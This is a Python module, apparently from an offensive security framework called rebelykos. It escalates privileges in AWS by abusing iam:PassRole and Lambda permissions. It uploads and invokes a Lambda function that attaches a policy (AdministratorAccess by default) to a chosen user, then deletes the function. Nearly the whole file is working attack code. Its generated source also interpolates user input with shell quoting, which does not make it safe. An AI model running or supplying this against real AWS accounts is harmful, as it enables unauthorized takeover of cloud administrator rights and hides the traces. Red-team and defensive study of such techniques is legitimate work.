import base64
import os
import shlex
import tempfile
import zipfile

import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module
from rebelykos.core.utils import gen_random_string


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "lambda_privesc"
        self.description = ("Elevate privilege by using iam:PassRole, "
                            "lambda:CreateFunction, and "
                            "lambda:InvokeFunction. "
                            "(and lambda:DeleteFunction")
        self.author = "Takahiro Yokoyama"
        self.options["UserName"] = {
            "Description": "User to elevate privilege.",
            "Required": True,
            "Value": ""
        }
        self.options["PolicyArn"] = {
            "Description": "Policy to attach to user.",
            "Required": True,
            "Value": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
        self.options["RoleArn"] = {
            "Description": ("The Amazon Resource Name (ARN) of"
                            " the function's execution role."),
            "Required": True,
            "Value": ""
        }

    def run(self):
        result = []
        client = boto3.client("lambda", **self["profile"])
        user = shlex.quote(self["UserName"])
        policyarn = shlex.quote(self["PolicyArn"])
        # I'm afraid this is really secure
        lambda_privesc = f"""
import boto3


def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='{user}',
        PolicyArn='{policyarn}'
    )
    return response
"""
        func_name = gen_random_string()
        with tempfile.TemporaryDirectory() as tmpdirname:
            zfile = os.path.join(tmpdirname, "lambda_privesc.py.zip")
            with zipfile.ZipFile(zfile, "w", zipfile.ZIP_DEFLATED) as fp:
                info = zipfile.ZipInfo("lambda_privesc.py")
                info.external_attr = 0o644 << 16
                fp.writestr(info, lambda_privesc)
            os.chmod(zfile, int("755", 8))
            with open(zfile, "rb") as fp:
                zfile_bytes = fp.read()
                result.extend(
                    self._handle_err(
                        client.create_function,
                        FunctionName=func_name,
                        Role=self["RoleArn"],
                        Handler="lambda_privesc.lambda_handler",
                        Code={"ZipFile": zfile_bytes},
                        Runtime="python3.9"
                    )
                )
                if result[-1][0] == res.RESULT:
                    resp = result.pop()[1]
                    status = resp["ResponseMetadata"]["HTTPStatusCode"]
                    result.append((res.INFO, {"HTTPStatusCode": status}))
                    result.extend(self._handle_err(client.invoke,
                                  InvocationType="RequestResponse",
                                  # LogType="Tail",
                                  FunctionName=func_name))
                    if result[-1][0] == res.RESULT:
                        resp = result.pop()[1]
                        status = resp["ResponseMetadata"]["HTTPStatusCode"]
                        result.append((res.INFO, {"HTTPStatusCode": status}))
                        result.extend(
                            self._handle_err(
                                client.delete_function,
                                FunctionName=func_name
                            )
                        )
                        if result[-1][0] == res.RESULT:
                            resp = result.pop()[1]
                            status = \
                                resp["ResponseMetadata"]["HTTPStatusCode"]
                            result.append((res.INFO,
                                           {"HTTPStatusCode": status}))
        return result
